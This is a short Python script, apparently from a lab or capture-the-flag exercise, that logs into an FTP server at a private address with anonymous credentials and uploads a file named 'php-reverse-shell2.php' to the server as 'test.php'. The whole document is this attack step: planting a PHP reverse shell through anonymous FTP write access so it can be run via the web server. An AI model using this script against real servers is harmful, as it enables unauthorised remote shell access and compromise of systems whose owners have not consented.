import ftplib
ftp = ftplib.FTP("192.168.0.32")
ftp.login("anonymous", "anonymous")
localfile='/home/theone/php-reverse-shell2.php'
remotefile='test.php'
with open(localfile, "rb") as file:
    ftp.storbinary('STOR %s' % remotefile, file)
